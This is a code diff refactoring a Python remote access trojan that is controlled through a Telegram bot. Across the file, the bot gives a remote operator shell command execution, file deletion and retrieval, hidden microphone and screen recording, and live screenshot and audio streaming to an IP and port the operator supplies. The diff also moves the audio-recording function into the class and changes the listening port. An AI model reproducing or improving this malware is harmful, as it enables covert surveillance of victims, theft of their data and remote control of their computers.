@@ -11,12 +11,12 @@ import os
 
 import numpy as np
 
-from ctypes  import windll
-from telebot import TeleBot
 from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
+from threading import Thread
+from telebot import TeleBot
+from ctypes  import windll
 from PIL import Image
 
-from threading import Thread
 
 
 
@@ -44,49 +44,19 @@ def create_markup():
     markup.add("EXIT")
     return markup
 
-def recordAUDIO(self, time=6):
-        p = pyaudio.PyAudio()
-        stream = p.open(format=self.FORMAT,
-                        channels=self.channels,
-                        rate=self.sample_rate,
-                        input=True,
-                        output=True,
-                        frames_per_buffer=self.chunk)
-        
-        frames = []
-        for i in range(int(self.sample_rate / self.chunk * time)):
-            data = stream.read(self.chunk)
-            frames.append(data)
-
-            with open('dump_record_audio.dat', 'wb') as dump_out:
-                pickle.dump(frames, dump_out, protocol=3)
-
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
-        wf = wave.open(self.filename_audio, "wb")
-        wf.setnchannels(self.channels)
-        wf.setsampwidth(p.get_sample_size(self.FORMAT))
-        wf.setframerate(self.sample_rate)
-
-        wf.writeframes(b"".join(frames))
-
-        wf.close()
-
-
 
 """ Functional """
 class Client:
     def __init__(self):
-        self.client_width = windll.user32.GetSystemMetrics(0)
-        self.client_height = windll.user32.GetSystemMetrics(1)
-        self.SCREEN_SIZE = (self.client_width, self.client_height)
-        self.fourcc = cv2.VideoWriter_fourcc(*"XVID")
+        self.SCREEN_WIDTH = windll.user32.GetSystemMetrics(0)
+        self.SCREEN_HEIGHT = windll.user32.GetSystemMetrics(1)
+        self.SCREEN_SIZE = (self.SCREEN_WIDTH, self.SCREEN_HEIGHT)
+        self.FOURCC = cv2.VideoWriter_fourcc(*"XVID")
         
         self.FORMAT = pyaudio.paInt16
-        self.sample_rate = 44100
-        self.channels = 1
-        self.chunk = 2048
+        self.RATE = 44100
+        self.CHANNELS = 1
+        self.CHUNK = 8192
         
         self.filename_audio = "recorded_audio.wav"
         self.filename_video = "video1.avi"
@@ -99,7 +69,6 @@ class Client:
         elif ms.text == "chdir":
             markup_chdir = create_markup()
             markup_chdir.add("..")
-            
             bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_chdir)
             
             @bot.message_handler(content_types=["text"])
@@ -113,6 +82,7 @@ class Client:
                         bot.send_message(ADMIN_ID, f"Error:\n{e}", reply_markup=markup)
                 else:
                     bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
+
             bot.register_next_step_handler(ms, chdir_next)
 
         elif ms.text == "dir":
@@ -129,7 +99,6 @@ class Client:
 
         elif ms.text == "rm_file":
             markup_rm = create_markup()
-            
             bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_rm)
 
             @bot.message_handler(content_types=["text"])
@@ -148,7 +117,6 @@ class Client:
         elif ms.text == "exec_cmd":
             markup_exec_cmd = ReplyKeyboardMarkup()
             markup_exec_cmd.add("EXIT")
-            
             bot.send_message(ADMIN_ID, "Enter command...")
 
             @bot.message_handler(content_types=["text"])
@@ -181,6 +149,7 @@ class Client:
                         bot.send_message(ADMIN_ID, f"Error:\n{e}")
                 else:
                     bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
+
             bot.register_next_step_handler(ms, get_file_next)
 
 
@@ -188,7 +157,7 @@ class Client:
             markup_record_audio = ReplyKeyboardMarkup()
             markup_record_audio.add("EXIT")
             bot.send_message(ADMIN_ID, "Enter time, quantity iteration...", reply_markup=markup_record_audio)
-            
+
             @bot.message_handler(content_types=["text"])
             def record_audio_next(ms):
                 if ms.text != "EXIT":
@@ -196,13 +165,14 @@ class Client:
                         list_data = ms.text.split(" ")
                         time = int(list_data[0])
                         quantity = int(list_data[1])
+
                         bot.send_message(ADMIN_ID, "Recording 🎲")
-                        
+
                         for i in range(quantity):
-                            recordAUDIO(self, time)
+                            self.recordAUDIO(time)
                             with open(self.filename_audio, 'rb') as audio:
                                 bot.send_audio(ADMIN_ID, audio)
-                        
+
                         os.remove(self.filename_audio)
                         bot.send_message(ADMIN_ID, "Finished recording ✅", reply_markup=markup)
                     except Exception as e:
@@ -219,16 +189,16 @@ class Client:
 
                 p = pyaudio.PyAudio()
                 stream = p.open(format=self.FORMAT,
-                                channels=self.channels,
-                                rate=self.sample_rate,
+                                channels=self.CHANNELS,
+                                rate=self.RATE,
                                 input=True,
                                 output=True,
-                                frames_per_buffer=self.chunk)
-                
+                                frames_per_buffer=self.CHUNK)
+
                 wf = wave.open(self.filename_audio, "wb")
-                wf.setnchannels(self.channels)
+                wf.setnchannels(self.CHANNELS)
                 wf.setsampwidth(p.get_sample_size(self.FORMAT))
-                wf.setframerate(self.sample_rate)
+                wf.setframerate(self.RATE)
                 wf.writeframes(b"".join(frame))
                 wf.close()
             
@@ -241,35 +211,34 @@ class Client:
             os.remove("dump_record_audio.dat")
 
 
-
         elif ms.text == "record_video":
             bot.send_message(ADMIN_ID, "Recording 🎲", reply_markup=markup)
-        
+
             while True:
-                stop_time = round(time.time()) + 70
+                break_time = round(time.time()) + 70
 
                 while os.path.exists(self.filename_video):
                     index = self.filename_video[5:-4]
                     self.filename_video = self.filename_video[:-5] + str(int(index) + 1) + ".avi"
 
-                out = cv2.VideoWriter(filename=self.filename_video, fourcc=self.fourcc, fps=15.0, frameSize=(self.SCREEN_SIZE))
+                video = cv2.VideoWriter(filename=self.filename_video, fourcc=self.FOURCC, fps=15.0, frameSize=(self.SCREEN_SIZE))
 
                 while True:
-                    if round(time.time()) == stop_time:
+                    if round(time.time()) == break_time:
                         cv2.destroyAllWindows()
-                        out.release()
+                        video.release()
                         break
-                    
+
                     frame = pyautogui.screenshot()
                     frame = np.array(frame)
-                    
+
                     frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-                    out.write(frame)
+                    video.write(frame)
 
         elif ms.text == "get_video":
             markup_video = create_markup()
             bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_video)
-            
+
             @bot.message_handler(content_types=["text"])
             def get_video_next(ms):
                 if ms.text != "EXIT":
@@ -280,6 +249,7 @@ class Client:
                         bot.send_message(ADMIN_ID, f"Error:\n{e}")
                 else:
                     bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
+
             bot.register_next_step_handler(ms, get_video_next)
 
 
@@ -299,12 +269,12 @@ class Client:
                         PORT = int(list_data[0])
                         IP = list_data[1]
 
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        server_socket_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         __running = True
                         
                         try:
                             bot.send_message(ADMIN_ID, "Connection attempt 🎲")
-                            sock.connect((IP, PORT))
+                            server_socket_s.connect((IP, PORT))
                         except Exception as e:
                             bot.send_message(ADMIN_ID, "Сonnection error ❌", reply_markup=markup)
 
@@ -313,12 +283,12 @@ class Client:
                             screen = pyautogui.screenshot()
                             frame = np.array(screen)
                             frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-                            frame = cv2.resize(frame, (1440, 900), interpolation=cv2.INTER_AREA)
+                            frame = cv2.resize(frame, (1280, 768), interpolation=cv2.INTER_AREA)
                             result, frame = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
                             data = pickle.dumps(frame, 0)
                             
                             try:
-                                sock.sendall(struct.pack(">L", len(data)) + data)
+                                server_socket_s.sendall(struct.pack(">L", len(data)) + data)
                             except ConnectionResetError:
                                 __running = False
                             except ConnectionAbortedError:
@@ -333,41 +303,63 @@ class Client:
 
             bot.register_next_step_handler(ms, getscreen_next)
 
-    def get_micro(self):
-        port = 9112
-        chunk = 8192
-        FORMAT = pyaudio.paInt16
-        CHANNELS = 1
-        RATE = 44100
-
+    def recordAUDIO(self, time=6):
         p = pyaudio.PyAudio()
-        stream = p.open(format=FORMAT,
-                        channels=CHANNELS,
-                        rate=RATE,
+        stream = p.open(format=self.FORMAT,
+                        channels=self.CHANNELS,
+                        rate=self.RATE,
                         input=True,
                         output=True,
-                        frames_per_buffer=chunk)
+                        frames_per_buffer=self.CHUNK)
+        
+        frames = []
+        for i in range(int(self.RATE / self.CHUNK * time)):
+            data = stream.read(self.CHUNK)
+            frames.append(data)
 
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.bind(('', port))
-        server_socket.listen(5)
-        client_socket, address = server_socket.accept()
-
-        print("Your IP address is: ", socket.gethostbyname(socket.gethostname()))
-        print("Server Waiting for client on port ", port)
-
-        while self.running_micro:
-            try:
-                client_socket.sendall(stream.read(chunk))
-            except IOError as e:
-                self.running_micro = False
-                
-
+            with open('dump_record_audio.dat', 'wb') as dump_out:
+                pickle.dump(frames, dump_out, protocol=3)
 
         stream.stop_stream()
         stream.close()
-        server_socket.close()
-        client_socket.close()
+        p.terminate()
+        
+        wf = wave.open(self.filename_audio, "wb")
+        wf.setnchannels(self.CHANNELS)
+        wf.setsampwidth(p.get_sample_size(self.FORMAT))
+        wf.setframerate(self.RATE)
+        wf.writeframes(b"".join(frames))
+        wf.close()
+
+    def get_micro(self):
+        port = 9999
+        chunk = 8192
+
+        p = pyaudio.PyAudio()
+        stream = p.open(format=self.FORMAT,
+                        channels=self.CHANNELS,
+                        rate=self.RATE,
+                        input=True,
+                        output=True,
+                        frames_per_buffer=self.CHUNK)
+
+        server_socket_m = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket_m.bind(('', port))
+        server_socket_m.listen(5)
+        conn, addr = server_socket_m.accept()
+
+        while self.running_micro:
+            try:
+                conn.sendall(stream.read(chunk))
+            except IOError:
+                self.running_micro = False
+            except:
+                self.running_micro = False
+
+        stream.stop_stream()
+        stream.close()
+        server_socket_m.close()
+        conn.close()
         p.terminate()
 
 """ Variables """
